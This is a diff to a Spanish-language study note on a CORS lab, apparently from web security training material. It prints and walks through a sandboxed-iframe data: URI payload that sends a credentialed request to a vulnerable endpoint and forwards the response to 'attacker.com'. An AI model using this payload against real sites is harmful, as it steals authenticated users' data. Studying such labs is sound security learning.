@@ -170,6 +170,65 @@ req.send();
 </script>"></iframe>
 ```
 
+## Análisis del script CORS con `<iframe>` y `data:` URI
+
+Este script es una versión avanzada de un ataque CORS, que utiliza un `iframe` para ejecutar JavaScript malicioso dentro de una página aislada, y sin necesidad de archivos externos.
+
+---
+
+### El código completo
+
+```html
+<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+  location = 'https://attacker.com/log?data=' + this.responseText;
+};
+req.open('GET', 'https://vulnerable.com/data', true);
+req.withCredentials = true;
+req.send();
+</script>"></iframe>
+```
+
+---
+
+### 🔎 Desglose del funcionamiento
+
+#### 1. `<iframe ...>`
+
+Crea un contenedor que puede cargar contenido web externo o interno. En este caso, **carga HTML generado directamente desde una URI**.
+
+#### 2. `src="data:text/html,..."`
+
+Se está utilizando un `data:` URI para generar una pequeña página HTML que contiene un `<script>` embebido. Esto evita depender de archivos externos.
+
+#### 3. `sandbox="allow-scripts allow-forms"`
+
+Este atributo impone restricciones al contenido del iframe:
+
+* `allow-scripts`: permite ejecutar scripts dentro del iframe.
+* `allow-forms`: permite el uso de formularios.
+* No se incluye `allow-same-origin`, por lo tanto **el iframe no puede acceder al DOM del documento padre**, pero **sí puede ejecutar su propio JavaScript**.
+
+#### 4. El `script` dentro del iframe
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = function() {
+  location = 'https://attacker.com/log?data=' + this.responseText;
+};
+req.open('GET', 'https://vulnerable.com/data', true);
+req.withCredentials = true;
+req.send();
+```
+
+Este código realiza:
+
+* Una solicitud autenticada (`withCredentials = true`) al endpoint vulnerable.
+* Cuando recibe la respuesta, redirige al navegador a un sitio malicioso (`attacker.com`) pasando los datos como parámetro.
+
+---
+
 [Lab: CORS vulnerability with trusted null origin](2_CORS_vulnerability_with_trusted_null_origin.md)  
 
 ![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 
